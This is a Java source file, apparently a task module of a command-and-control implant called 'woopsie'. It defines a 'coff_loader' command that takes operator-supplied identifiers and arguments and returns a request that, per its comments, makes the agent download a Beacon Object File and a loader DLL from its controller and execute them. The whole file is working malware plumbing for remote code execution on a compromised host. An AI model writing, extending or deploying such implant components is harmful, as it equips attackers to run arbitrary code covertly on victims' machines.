package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.sun.jna.NativeLong;
import com.sun.jna.Pointer;
import com.sun.jna.ptr.PointerByReference;
import com.woopsie.Config;
import com.woopsie.tasks.Task;
import com.woopsie.utils.CoffLoaderLibrary;
import com.woopsie.utils.NativeLongByReference;

/**
 * COFF Loader task - initiates BOF execution
 * Returns metadata to trigger CoffLoaderBackgroundTask which downloads and executes the BOF
 */
public class CoffLoaderTask implements Task {
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        Config.debugLog(config, "Executing coff_loader command");
        
        com.fasterxml.jackson.databind.ObjectMapper mapper = new com.fasterxml.jackson.databind.ObjectMapper();
        
        // Extract parameters
        String fileUuid = parameters.has("uuid") ? parameters.get("uuid").asText() : "";
        String dllUuid = parameters.has("dll_uuid") ? parameters.get("dll_uuid").asText() : "";
        String bofName = parameters.has("bof_name") ? parameters.get("bof_name").asText() : "";
        String argsB64 = parameters.has("args") ? parameters.get("args").asText() : "";
        
        Config.debugLog(config, "Initiating BOF download: " + bofName + " (uuid: " + fileUuid + ")");
        Config.debugLog(config, "COFFLoader DLL uuid: " + dllUuid);
        
        // Return special JSON to trigger background BOF execution
        // This tells Agent.java to start a CoffLoaderBackgroundTask
        java.util.Map<String, Object> coffRequest = new java.util.HashMap<>();
        coffRequest.put("file_id", fileUuid);
        coffRequest.put("dll_id", dllUuid);
        coffRequest.put("bof_name", bofName);
        coffRequest.put("args", argsB64);
        coffRequest.put("chunk_size", DownloadTask.CHUNK_SIZE);
        
        java.util.Map<String, Object> result = new java.util.HashMap<>();
        result.put("coff_loader", coffRequest);
        
        return mapper.writeValueAsString(result);
    }
    
    @Override
    public String getCommandName() {
        return "coff_loader";
    }
}
